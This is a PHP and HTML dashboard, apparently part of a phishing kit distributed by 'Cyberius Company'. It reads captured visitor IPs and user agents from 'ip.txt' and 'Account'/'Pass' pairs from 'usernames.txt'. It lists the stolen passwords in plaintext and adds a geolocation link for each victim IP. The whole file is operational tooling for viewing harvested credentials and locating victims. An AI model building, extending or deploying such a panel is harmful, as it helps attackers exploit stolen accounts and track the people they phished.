<?php
function leerIP($archivo) {
    if (!file_exists($archivo)) return [];

    $contenido = file_get_contents($archivo);
    $bloques = array_filter(explode('=============================', $contenido));

    $mapa = [];

    foreach ($bloques as $bloque) {
        preg_match('/Fecha:\s*(.*)/', $bloque, $fecha);
        preg_match('/IP:\s*(.*)/', $bloque, $ip);
        preg_match('/User-Agent:\s*(.*)/', $bloque, $ua);

        $fecha = trim($fecha[1] ?? '');
        $ip    = trim($ip[1] ?? '');
        $ua    = trim($ua[1] ?? '');

        if ($ip === '' || $ua === '') continue;

        // Clave única IP + UserAgent
        $clave = md5($ip . $ua);

        // Guardar solo el más reciente
        if (!isset($mapa[$clave]) || strtotime($fecha) > strtotime($mapa[$clave]['fecha'])) {
            $mapa[$clave] = [
                'fecha' => $fecha,
                'ip'    => $ip,
                'ua'    => $ua
            ];
        }
    }

    return array_values($mapa);
}

function leerCredenciales($archivo) {
    if (!file_exists($archivo)) return [];

    $lineas = file($archivo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $mapa = [];

    foreach ($lineas as $linea) {
        preg_match('/Account:\s*(\S+)/', $linea, $acc);
        preg_match('/Pass:\s*(.+)/', $linea, $pass);

        $acc  = trim($acc[1] ?? '');
        $pass = trim($pass[1] ?? '');

        if ($acc === '' || $pass === '') continue;

        $clave = md5($acc . $pass);
        $mapa[$clave] = [
            'account' => $acc,
            'pass'    => $pass
        ];
    }

    return array_values($mapa);
}

// Función para extraer OS y Navegador
function parseUserAgent($ua) {
    $os = 'Otro';
    $browser = 'Otro';

    $ua_lower = strtolower($ua);

    // Detectar OS
    if (strpos($ua_lower, 'windows') !== false) $os = 'Windows';
    elseif (strpos($ua_lower, 'linux') !== false) $os = 'Linux';
    elseif (strpos($ua_lower, 'mac') !== false || strpos($ua_lower, 'darwin') !== false) $os = 'Mac';

    // Detectar navegador
    if (strpos($ua_lower, 'firefox') !== false) $browser = 'Firefox';
    elseif (strpos($ua_lower, 'chrome') !== false && strpos($ua_lower, 'edg') === false) $browser = 'Chrome';
    elseif (strpos($ua_lower, 'edg') !== false) $browser = 'Edge';
    elseif (strpos($ua_lower, 'safari') !== false && strpos($ua_lower, 'chrome') === false) $browser = 'Safari';

    return [$os, $browser];
}

$ips = leerIP('ip.txt');
$credenciales = leerCredenciales('usernames.txt');
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Visor de Logs</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
body {
    background-color: #2d3037;
    color: #939194;
    font-family: "Segoe UI", Arial, sans-serif;
    margin: 0;
    padding: 20px;
}
h1 {
    color: #83f1e8;
    text-align: center;
    margin-bottom: 20px;
}

.container {
    display: flex;
    gap: 20px;
    flex-wrap: wrap;
}

.column {
    flex: 1;
    min-width: 320px;
    background-color: #4f5354;
    border-radius: 6px;
    padding: 15px;
    max-height: 75vh;
    overflow-y: auto;
}

.column h2 {
    color: #83f1e8;
    margin-bottom: 10px;
}

/* Tabla */
table {
    width: 100%;
    border-collapse: collapse;
}

thead th {
    color: #83f1e8;
    font-size: 0.85rem;
    padding: 8px;
}

td {
    padding: 7px;
    font-size: 0.8rem;
    color: #e0e0e0;
    border-top: 1px solid #2d3037;
    word-break: break-all;
}

tbody tr:hover {
    background-color: rgba(131, 241, 232, 0.08);
}

/* Botón geolocalizar */
.geo-btn {
    background-color: #83f1e8;
    color: #2d3037;
    padding: 4px 8px;
    border-radius: 5px;
    font-size: 0.75rem;
    text-decoration: none;
    font-weight: bold;
    transition: opacity 0.2s ease;
}

.geo-btn:hover {
    opacity: 0.8;
}

/* Footer */
.footer {
    margin-top: 40px;
    padding: 25px 15px;
    border-top: 1px solid #4f5354;
}
.footer-socials {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-bottom: 15px;
}
.social-item {
    display: flex;
    align-items: center;
    gap: 0.6rem;
}
.social-item i {
    font-size: 1.3rem;
}
.btn {
    padding: 0.45rem 0.9rem;
    border-radius: 6px;
    color: #fff;
    text-decoration: none;
}
.github { background:#333; }
.youtube { background:red; }
.paypal { background:#0070ba; }
.discord { background:#5865F2; }
.footer-copy {
    text-align: center;
    font-size: 0.85rem;
    color: #939194;
}
</style>
</head>
<body>

<h1>📊 Dashboard de Registros</h1>

<div class="container">
<!-- IPs -->
<div class="column">
<h2>📡 IPs únicas</h2>
<table>
<thead>
<tr>
<th>Fecha</th>
<th>IP</th>
<th>SO</th>
<th>Navegador</th>
<th></th>
</tr>
</thead>
<tbody>
<?php if(empty($ips)): ?>
<tr><td colspan="5">Sin datos</td></tr>
<?php else: foreach($ips as $ip): 
    list($os, $browser) = parseUserAgent($ip['ua']);
?>
<tr>
<td><?= htmlspecialchars($ip['fecha']) ?></td>
<td><?= htmlspecialchars($ip['ip']) ?></td>
<td><?= $os ?></td>
<td><?= $browser ?></td>
<td>
<a class="geo-btn" href="https://ipinfo.io/<?= urlencode($ip['ip']) ?>" target="_blank">
Geolocalizar
</a>
</td>
</tr>
<?php endforeach; endif; ?>
</tbody>
</table>
</div>

<!-- Credenciales -->
<div class="column">
<h2>🔐 Credenciales únicas</h2>
<table>
<thead>
<tr>
<th>Account</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<?php if(empty($credenciales)): ?>
<tr><td colspan="2">Sin datos</td></tr>
<?php else: foreach($credenciales as $c): ?>
<tr>
<td><?= htmlspecialchars($c['account']) ?></td>
<td><?= htmlspecialchars($c['pass']) ?></td>
</tr>
<?php endforeach; endif; ?>
</tbody>
</table>
</div>
</div>

<footer class="footer">
<div class="footer-socials">
<div class="social-item"><i class="fab fa-github"></i><a class="btn github" href="https://github.com/cyberiuscompany" target="_blank">GitHub</a></div>
<div class="social-item"><i class="fab fa-youtube"></i><a class="btn youtube" href="https://www.youtube.com/@CyberiusCompany" target="_blank">YouTube</a></div>
<div class="social-item"><i class="fab fa-paypal"></i><a class="btn paypal" href="https://paypal.me/CyberiusCompany" target="_blank">PayPal</a></div>
<div class="social-item"><i class="fab fa-discord"></i><a class="btn discord" href="https://disboard.org/server/1299310806617292922" target="_blank">Discord</a></div>
</div>
<div class="footer-copy">
&copy; 2025 Cyberius Company. Todos los derechos reservados.
</div>
</footer>

</body>
</html>
